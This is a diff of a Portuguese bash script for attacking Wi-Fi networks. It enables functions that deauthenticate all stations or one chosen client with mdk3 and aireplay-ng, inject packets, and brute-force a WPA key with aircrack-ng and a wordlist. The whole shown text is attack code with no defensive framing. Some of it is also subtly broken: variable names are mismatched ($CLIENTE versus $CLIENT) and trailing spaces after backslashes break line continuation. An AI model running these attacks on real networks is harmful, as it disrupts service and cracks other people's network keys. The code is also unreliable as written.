@@ -123,37 +123,43 @@ echo -e "[ FALHA ] Ocorreram erros"
 function deauth_todos() {
 # Desautentica todas as STA do AP
 (aireplay-ng --interactive 1000 -c $CLIENTE wlan0mon) || \
-echo "[ FALHA ] Ocorreram erros em fazer o deauth do cliente: $CLIENTE"
+echo "[ FALHA ] Ocorreram erros em fazer o deauth do cliente: $CLIENT"
 
 }
 
-#function deauth_mdk3() {
-#xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating via mdk3 all clients on $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN & 
-#|| { echo "[ FALHA ]"; }
-#}
+function deauth_mdk3() {
+(xterm -hold -bg "#000000" -fg "#FF0009" -title "Deauth de todas as STA via mdk3 no AP: $ESSID" -e mdk3 $INTERFACE_MON d -b $DIR/mdk3.txt -c $CHANNEL &) || \ 
+echo "[ FALHA ] Ocorreram erros em fazer o deauth das STA no AP: $ESSID"
 
-#function deauth_alvo_especifico() {
-#xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating client $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI & 
-#|| { echo "[ FALHA ]"; }
-#}
+}
+
+function deauth_alvo_especifico() {
+(xterm -hold -bg "#000000" -fg "#FF0009" -title "Deauth o cliente: $CLIENT" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $CLIENT --ignore-negative-one $WIFI &) || \ 
+echo "[ FALHA ] Ocorreram erros em fazer o deauth da STA: $CLIENT no AP: $ESSID"
+
+}
 
 
-#function injetar(){
-#(aireplay-ng --interactive 1000 -c $CLIENTE $INTERFACE_MON) || echo "[ FALHA ]"
-#}
+function injetar() {
+(aireplay-ng --interactive 1000 -c $CLIENTE $INTERFACE_MON) || \ 
+echo "[ FALHA ] Ocorreram erros em injetar pacotes no STA: $CLIENT"
 
-#function brute_force_psk() {
-#(aircrack-ng -w $WORDLIST $OUTPUT/$ARQ) || echo "[ FALHA ]"
-#}
+}
+
+function brute_force_psk() {
+(aircrack-ng -w $WORDLIST $DIR/$ARQ) || \ 
+echo "[ FALHA ] "
+
+}
 
 function matar_todos_processos() {
-
 iw dev wlan0mon del
 pkill xterm
 pkill airodump-ng
 pkill aireplay-ng
 pkill airmon-ng 
-service networking restart
+/etc/init.d/networking restart
+/etc/init.d/network-manager restart 
 
 }
 
